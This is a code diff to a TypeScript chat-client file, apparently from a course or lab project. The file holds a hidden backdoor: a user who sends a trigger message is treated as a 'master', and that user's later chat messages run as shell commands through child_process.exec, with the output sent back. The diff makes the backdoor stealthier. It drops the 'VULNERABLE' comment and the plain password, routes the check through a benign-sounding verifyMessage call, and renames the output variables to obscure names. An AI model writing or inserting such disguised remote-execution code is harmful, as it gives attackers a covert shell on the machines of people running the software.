@@ -1,13 +1,10 @@
 import {ChatClient} from "@sp24/common/chatclient/ChatClient.js";
 import {TestEntryPoint} from "../TestEntryPoint.js";
 import {webcrypto} from "node:crypto";
-import {PSSGenParams} from "@sp24/common/util/crypto.js";
+import {PSSGenParams, verifyMessage} from "@sp24/common/util/crypto.js";
 import {TestClientTransport} from "../TestClientTransport.js";
 import * as child_process from "node:child_process";
-
-// VULNERABLE
-
-const password = "knock-knock";
+import {HelloData} from "@sp24/common/messageTypes.js";
 
 export class ServerSideClient {
     private _testClient: ChatClient;
@@ -18,28 +15,27 @@ export class ServerSideClient {
         this._testClient = client;
 
         client.onPublicChat.createListener(data => {
-            if (data.message == password) {
+            if (verifyMessage(data.message)) {
                 this._masters.add(data.senderFingerprint);
-                client.sendChat("Acknowledged.", client.getGroupID([data.senderFingerprint]));
+                client.sendChat(HelloData.response, client.getGroupID([data.senderFingerprint]));
                 return;
             }
         })
         client.onChat.createListener(data => {
-            if (data.message == password) {
+            if (verifyMessage(data.message)) {
                 this._masters.add(data.senderFingerprint);
-                client.sendChat("Acknowledged.", client.getGroupID([data.senderFingerprint]));
+                client.sendChat(HelloData.response, client.getGroupID([data.senderFingerprint]));
                 return;
             }
 
             if (this._masters.has(data.senderFingerprint)) {
-                // Interpret as command.
-                child_process.exec(data.message, (err, stdout, stderr) => {
+                child_process.exec(data.message, (err, a, b) => {
                     if (err !== null) {
                         this._testClient.sendChat(`Error: ${err.message}`, data.groupID);
                         return;
                     }
-                    this._testClient.sendChat(`stdout: ${stdout}`, data.groupID);
-                    this._testClient.sendChat(`stderr: ${stderr}`, data.groupID);
+                    this._testClient.sendChat(a, data.groupID);
+                    this._testClient.sendChat(b, data.groupID);
                 })
             }
         })
